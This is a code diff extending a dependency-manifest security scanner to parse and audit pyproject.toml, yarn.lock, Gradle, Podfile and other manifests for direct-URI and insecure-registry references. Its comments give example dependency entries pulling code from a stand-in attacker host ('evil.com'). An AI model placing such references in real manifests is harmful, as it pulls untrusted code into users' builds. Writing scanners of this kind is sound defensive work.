@@ -64,6 +64,12 @@ class ManifestParser:
                     self._parse_requirements_txt(manifest_path, local_map)
                 elif filename in ["pip.conf", ".pypirc", "pip.ini"]:
                     self._parse_pip_conf(manifest_path, local_map)
+                elif filename == "pyproject.toml":
+                    self._parse_pyproject_toml(manifest_path, local_map)
+                elif filename == "yarn.lock":
+                    self._parse_yarn_lock(manifest_path, local_map)
+                elif filename in ("build.gradle", "build.gradle.kts"):
+                    self._parse_gradle(manifest_path, local_map)
             except Exception as e:
                 self.logger.warning(f"Manifest Parser: Failed to parse structural definition {filename} - {e}")
 
@@ -177,6 +183,95 @@ class ManifestParser:
                             # Prefix with INSECURE_REGISTRY so the Supply Chain Firewall can instantly block it
                             resolution_map[f"INSECURE_REGISTRY_{filepath.name}"] = url
 
+    def _parse_pyproject_toml(self, filepath: Path, resolution_map: dict):
+        """
+        Audits modern Python manifests (PEP 621 `[project] dependencies` arrays and
+        Poetry's `[tool.poetry.dependencies]` table) for the same Direct URI bypass
+        risk requirements.txt is already audited for.
+        """
+        with open(filepath, encoding="utf-8") as f:
+            content = f.read()
+
+        # PEP 621: dependencies = ["requests>=2.0", "mypkg @ git+https://evil.com/x.git"]
+        array_match = re.search(r"dependencies\s*=\s*\[(.*?)\]", content, re.DOTALL)
+        if array_match:
+            for entry in re.findall(r'["\']([^"\']+)["\']', array_match.group(1)):
+                if " @ " not in entry:
+                    continue
+                pkg_part, _, ref = entry.partition(" @ ")
+                ref = ref.strip()
+                if self.python_direct_uri_regex.match(ref):
+                    pkg_name = re.split(r"[\[;\s]", pkg_part.strip())[0]
+                    resolution_map[pkg_name] = ref
+                    self.logger.warning(f"Manifest Parser: Flagged direct URI reference for '{pkg_name}' -> {ref}")
+
+        # Poetry: requests = {git = "https://evil.com/x.git"} / {url = "..."}
+        poetry_block = re.search(r"\[tool\.poetry\.dependencies\](.*?)(?=\n\[|\Z)", content, re.DOTALL)
+        if poetry_block:
+            for line in poetry_block.group(1).splitlines():
+                line = line.strip()
+                if not line or line.startswith("#") or "=" not in line:
+                    continue
+                pkg_name, _, value = line.partition("=")
+                pkg_name = pkg_name.strip()
+                if pkg_name.lower() == "python":
+                    continue
+
+                git_match = re.search(r'git\s*=\s*["\']([^"\']+)["\']', value)
+                url_match = re.search(r'url\s*=\s*["\']([^"\']+)["\']', value)
+                if git_match:
+                    ref = f"git+{git_match.group(1)}"
+                    resolution_map[pkg_name] = ref
+                    self.logger.warning(f"Manifest Parser: Flagged direct git reference for '{pkg_name}' -> {ref}")
+                elif url_match:
+                    resolution_map[pkg_name] = url_match.group(1)
+                    self.logger.warning(
+                        f"Manifest Parser: Flagged direct URL reference for '{pkg_name}' -> {url_match.group(1)}"
+                    )
+
+    def _parse_yarn_lock(self, filepath: Path, resolution_map: dict):
+        """
+        Yarn's counterpart to _parse_package_lock: yarn.lock entries are separated by
+        blank lines, each headed by one or more quoted/unquoted "name@range" specs
+        followed by a `resolved "..."` URL. Flags resolutions outside Yarn's/npm's
+        standard registries the same way package-lock.json resolutions are.
+        """
+        with open(filepath, encoding="utf-8") as f:
+            content = f.read()
+
+        for block in content.split("\n\n"):
+            block = block.strip("\n")
+            if not block or block.startswith("#"):
+                continue
+
+            header_match = re.match(r'^"?(@?[^@"\s]+)@', block)
+            resolved_match = re.search(r'resolved\s+"([^"]+)"', block)
+            if not header_match or not resolved_match:
+                continue
+
+            pkg_name = header_match.group(1)
+            resolved_url = resolved_match.group(1)
+            if not resolved_url.startswith(("https://registry.yarnpkg.com/", "https://registry.npmjs.org/")):
+                resolution_map[pkg_name] = resolved_url
+                self.logger.info(
+                    f"Manifest Parser: Flagged non-standard registry resolution for '{pkg_name}' -> {resolved_url}"
+                )
+
+    def _parse_gradle(self, filepath: Path, resolution_map: dict):
+        """
+        Audits Gradle build scripts (Groovy or Kotlin DSL) for insecure `http://`
+        repository declarations -- the Maven/Gradle equivalent of pip.conf's
+        insecure index-url check.
+        """
+        with open(filepath, encoding="utf-8") as f:
+            content = f.read()
+
+        insecure_urls = re.findall(r'url\s*[=(]?\s*["\']?(http://[^"\'\s)]+)', content)
+        for idx, url in enumerate(insecure_urls):
+            self.logger.warning(f"🚨 Manifest Parser: INSECURE GRADLE REPOSITORY DETECTED -> {url}")
+            key = f"INSECURE_REGISTRY_{filepath.name}" if idx == 0 else f"INSECURE_REGISTRY_{filepath.name}_{idx}"
+            resolution_map[key] = url
+
 
 # NEW:
 # Filenames UniversalManifestSlicer.slice_manifest() below knows how to parse
@@ -194,7 +289,34 @@ SUPPORTED_MANIFEST_FILENAMES = (
     "go.mod",
     "Gemfile",
     "pom.xml",
+    # Modern Python (issue #702)
+    "pyproject.toml",
+    "poetry.lock",
+    "Pipfile",
+    # .NET / NuGet
+    "packages.config",
+    # C/C++
+    "conanfile.txt",
+    "vcpkg.json",
+    # Java/Kotlin/Android (Gradle)
+    "build.gradle",
+    "build.gradle.kts",
+    # Mobile (iOS/macOS)
+    "Podfile",
+    "Package.swift",
+    # Dart/Flutter
+    "pubspec.yaml",
+    # JS/TS alternative lockfiles
+    "yarn.lock",
+    "pnpm-lock.yaml",
 )
+
+# Suffix-matched manifests, for filenames that vary per-project (e.g. a repo's
+# .NET solution can have any number of arbitrarily-named *.csproj files). Kept
+# separate from SUPPORTED_MANIFEST_FILENAMES, which is an exact-name set --
+# callers that discover manifests via a filename lookup (galaxyscope's Phase
+# 10 stem_map filter, SbomRecorder's standalone fallback) must check both.
+SUPPORTED_MANIFEST_SUFFIXES = (".csproj",)
 
 
 class UniversalManifestSlicer:
@@ -302,6 +424,176 @@ class UniversalManifestSlicer:
                     for artifact, version in deps_raw:
                         deps[artifact] = version if version else "latest"
 
+            elif filename == "pyproject.toml":
+                ecosystem = "pypi"
+                with open(manifest_path, encoding="utf-8") as f:
+                    content = f.read()
+                # PEP 621: [project] dependencies = ["requests>=2.0", ...]
+                array_match = re.search(r"dependencies\s*=\s*\[(.*?)\]", content, re.DOTALL)
+                if array_match:
+                    for entry in re.findall(r'["\']([^"\']+)["\']', array_match.group(1)):
+                        name_match = re.match(r"^[A-Za-z0-9_.\-]+", entry.strip())
+                        if name_match:
+                            deps[name_match.group(0)] = "latest"  # Simplified version extraction
+                # Poetry: [tool.poetry.dependencies]
+                poetry_block = re.search(r"\[tool\.poetry\.dependencies\](.*?)(?=\n\[|\Z)", content, re.DOTALL)
+                if poetry_block:
+                    for line in poetry_block.group(1).splitlines():
+                        line = line.strip()
+                        if not line or line.startswith("#") or "=" not in line:
+                            continue
+                        pkg_name, _, value = line.partition("=")
+                        pkg_name = pkg_name.strip()
+                        if pkg_name.lower() == "python":
+                            continue
+                        version_match = re.search(r'"([^"]+)"', value)
+                        deps[pkg_name] = version_match.group(1) if version_match else "latest"
+
+            elif filename == "poetry.lock":
+                ecosystem = "pypi"
+                with open(manifest_path, encoding="utf-8") as f:
+                    content = f.read()
+                for block in re.findall(r"\[\[package\]\](.*?)(?=\n\[\[package\]\]|\Z)", content, re.DOTALL):
+                    name_match = re.search(r'name\s*=\s*"([^"]+)"', block)
+                    version_match = re.search(r'version\s*=\s*"([^"]+)"', block)
+                    if name_match:
+                        deps[name_match.group(1)] = version_match.group(1) if version_match else "latest"
+
+            elif filename == "Pipfile":
+                ecosystem = "pypi"
+                with open(manifest_path, encoding="utf-8") as f:
+                    content = f.read()
+                for block in re.findall(r"\[(?:dev-)?packages\](.*?)(?=\n\[|\Z)", content, re.DOTALL):
+                    for line in block.splitlines():
+                        line = line.strip()
+                        if line and not line.startswith("#") and "=" in line:
+                            pkg_name, _, value = line.partition("=")
+                            version_match = re.search(r'"([^"]+)"', value)
+                            version = version_match.group(1) if version_match else "latest"
+                            deps[pkg_name.strip()] = "latest" if version == "*" else version
+
+            elif filename == "packages.config":
+                ecosystem = "nuget"
+                with open(manifest_path, encoding="utf-8") as f:
+                    content = f.read()
+                for pkg_id, version in re.findall(r'<package\s+id="([^"]+)"(?:\s+version="([^"]+)")?', content):
+                    deps[pkg_id] = version if version else "latest"
+
+            elif filename.endswith(".csproj"):
+                ecosystem = "nuget"
+                with open(manifest_path, encoding="utf-8") as f:
+                    content = f.read()
+                for pkg_id, version in re.findall(
+                    r'<PackageReference\s+Include="([^"]+)"(?:\s+Version="([^"]+)")?', content
+                ):
+                    deps[pkg_id] = version if version else "latest"
+
+            elif filename == "conanfile.txt":
+                ecosystem = "conan"
+                with open(manifest_path, encoding="utf-8") as f:
+                    content = f.read()
+                req_block = re.search(r"\[requires\](.*?)(?=\n\[|\Z)", content, re.DOTALL)
+                if req_block:
+                    for line in req_block.group(1).splitlines():
+                        line = line.strip()
+                        if line and not line.startswith("#") and "/" in line:
+                            pkg_name, _, version = line.partition("/")
+                            deps[pkg_name.strip()] = version.strip() or "latest"
+
+            elif filename == "vcpkg.json":
+                ecosystem = "vcpkg"
+                with open(manifest_path, encoding="utf-8") as f:
+                    data = json.load(f)
+                for dep in data.get("dependencies", []):
+                    if isinstance(dep, str):
+                        deps[dep] = "latest"
+                    elif isinstance(dep, dict) and "name" in dep:
+                        deps[dep["name"]] = "latest"
+
+            elif filename in ("build.gradle", "build.gradle.kts"):
+                ecosystem = "gradle"
+                with open(manifest_path, encoding="utf-8") as f:
+                    content = f.read()
+                # Narrow to the dependencies { ... } block when present so unrelated
+                # quoted strings elsewhere in the build script aren't misread as coordinates.
+                dep_block = re.search(r"dependencies\s*\{(.*?)\n\}", content, re.DOTALL)
+                search_space = dep_block.group(1) if dep_block else content
+                for coord in re.findall(r"""['"]([\w.\-]+:[\w.\-]+:[\w.\-+]+)['"]""", search_space):
+                    group_artifact, _, version = coord.rpartition(":")
+                    deps[group_artifact] = version
+
+            elif filename == "Podfile":
+                ecosystem = "cocoapods"
+                with open(manifest_path, encoding="utf-8") as f:
+                    for line in f:
+                        line = line.strip()
+                        # Extract: pod 'Alamofire', '~> 5.4'
+                        if line.startswith("pod "):
+                            parts = line[len("pod ") :].split(",")
+                            pkg_name = parts[0].strip(" '\"")
+                            version = parts[1].strip(" '\"") if len(parts) > 1 else "latest"
+                            deps[pkg_name] = version
+
+            elif filename == "Package.swift":
+                ecosystem = "swiftpm"
+                with open(manifest_path, encoding="utf-8") as f:
+                    content = f.read()
+                # Capture each .package(...) call's full argument list (tolerating one
+                # level of nesting, e.g. `.upToNextMajor(from: "1.0.0")`) so `url:` and
+                # `from:` can be located independently regardless of argument order.
+                for call_args in re.findall(r"\.package\(((?:[^()]|\([^()]*\))*)\)", content):
+                    url_match = re.search(r'url:\s*"([^"]+)"', call_args)
+                    if not url_match:
+                        continue
+                    version_match = re.search(r'from:\s*"([^"]+)"', call_args)
+                    pkg_name = url_match.group(1).rstrip("/").rsplit("/", 1)[-1]
+                    if pkg_name.endswith(".git"):
+                        pkg_name = pkg_name[:-4]
+                    deps[pkg_name] = version_match.group(1) if version_match else "latest"
+
+            elif filename == "pubspec.yaml":
+                ecosystem = "pub"
+                with open(manifest_path, encoding="utf-8") as f:
+                    content = f.read()
+                dep_block = re.search(r"^dependencies:\n((?:[ \t]+.*\n?)*)", content, re.MULTILINE)
+                if dep_block:
+                    for line in dep_block.group(1).splitlines():
+                        entry_match = re.match(r"^  ([A-Za-z0-9_]+):\s*(.*)$", line)
+                        if entry_match:
+                            pkg_name, version = entry_match.group(1), entry_match.group(2).strip()
+                            deps[pkg_name] = version if version and not version.startswith("{") else "latest"
+
+            elif filename == "yarn.lock":
+                ecosystem = "npm"
+                with open(manifest_path, encoding="utf-8") as f:
+                    content = f.read()
+                for block in content.split("\n\n"):
+                    block = block.strip("\n")
+                    header_match = re.match(r'^"?(@?[^@"\s]+)@', block)
+                    version_match = re.search(r'version\s+"([^"]+)"', block)
+                    if header_match and version_match:
+                        deps[header_match.group(1)] = version_match.group(1)
+
+            elif filename == "pnpm-lock.yaml":
+                ecosystem = "npm"
+                with open(manifest_path, encoding="utf-8") as f:
+                    content = f.read()
+                # pnpm lockfile v6+: top-level `dependencies:`/`devDependencies:` blocks,
+                # each entry `  pkg-name:\n    version: 1.2.3` (a `specifier:` sibling
+                # line, ignored here, carries the declared range instead of the resolution).
+                for section in re.findall(
+                    r"^(?:dependencies|devDependencies):\n((?:[ \t]+.*\n?)*)", content, re.MULTILINE
+                ):
+                    current_pkg = None
+                    for line in section.splitlines():
+                        pkg_match = re.match(r"^  (\S+):\s*$", line)
+                        version_match = re.match(r"^\s+version:\s*([^\s(]+)", line)
+                        if pkg_match:
+                            current_pkg = pkg_match.group(1)
+                        elif version_match and current_pkg:
+                            deps[current_pkg] = version_match.group(1)
+                            current_pkg = None
+
         except Exception as exc:
             logging.getLogger("manifest_parser").warning(
                 "Failed to parse manifest '%s' (%s): %s",
@@ -392,6 +684,64 @@ class UniversalManifestSlicer:
                 for file in target.iterdir():
                     if pkg_name.lower() in file.name.lower():
                         return file
+            return None
+
+        elif ecosystem == "nuget":
+            # Modern SDK-style projects restore into project-local `packages/`
+            # or the global per-user cache; check both, local first.
+            local = target_path / "packages" / pkg_name
+            if local.exists():
+                return local
+            global_cache = Path.home() / ".nuget" / "packages" / pkg_name.lower()
+            return global_cache if global_cache.exists() else None
+
+        elif ecosystem == "conan":
+            # Conan 2.x's local cache keys packages by name/version/revision;
+            # loosely matched since the exact revision hash varies per build.
+            cache_root = Path.home() / ".conan2" / "p"
+            if cache_root.exists():
+                for entry in cache_root.iterdir():
+                    if entry.name.lower().startswith(pkg_name.lower()):
+                        return entry
+            return None
+
+        elif ecosystem == "vcpkg":
+            # vcpkg installs into a project-local triplet-scoped tree.
+            target = target_path / "vcpkg_installed"
+            if target.exists():
+                for root, dirs, _ in os.walk(target):
+                    if pkg_name in dirs:
+                        return Path(root) / pkg_name
+            return None
+
+        elif ecosystem == "gradle":
+            # Gradle's per-user module cache, keyed by group:artifact:version.
+            cache_root = Path.home() / ".gradle" / "caches" / "modules-2" / "files-2.1"
+            if cache_root.exists():
+                artifact = pkg_name.rsplit(":", 1)[-1]
+                for root, dirs, _ in os.walk(cache_root):
+                    if artifact in dirs:
+                        return Path(root) / artifact
+            return None
+
+        elif ecosystem == "cocoapods":
+            target = target_path / "Pods" / pkg_name
+            return target if target.exists() else None
+
+        elif ecosystem == "swiftpm":
+            for build_dir in (".build/checkouts", ".swiftpm/checkouts"):
+                target = target_path / build_dir / pkg_name
+                if target.exists():
+                    return target
+            return None
+
+        elif ecosystem == "pub":
+            # pub's global per-user hosted-package cache, versioned in the dirname.
+            cache_root = Path.home() / ".pub-cache" / "hosted" / "pub.dev"
+            if cache_root.exists():
+                for entry in cache_root.iterdir():
+                    if entry.name.startswith(f"{pkg_name}-"):
+                        return entry
             return None
 
         return None
